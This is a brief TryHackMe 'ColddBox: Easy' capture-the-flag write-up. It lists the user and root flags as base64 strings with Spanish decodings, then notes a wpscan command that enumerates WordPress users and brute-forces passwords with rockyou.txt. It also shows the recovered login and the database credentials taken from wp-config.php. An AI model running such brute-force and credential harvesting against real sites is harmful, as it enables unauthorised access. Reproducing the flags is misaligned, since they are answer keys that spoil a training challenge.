# TryHackMe ColddBox: Easy

# Saikat Karmakar | Jan 8:2021

# Task 1
1. user.txt
```
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
Felicidades, primer nivel conseguido!
```
2. root.txt
```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
¡Felicidades, máquina completada!
```

***Notes***
//find users & brute force password

wpscan --url http://10.10.136.119 -e u --passwords /usr/share/wordlists/rockyou.txt --max-threads 64

```
[!] Valid Combinations Found:
 | Username: C0ldd, Password: 9876543210
```

```
/var/www/html/wp-config.php:define('DB_PASSWORD', 'cybersecurity');
/var/www/html/wp-config.php:define('DB_USER', 'c0ldd');
```
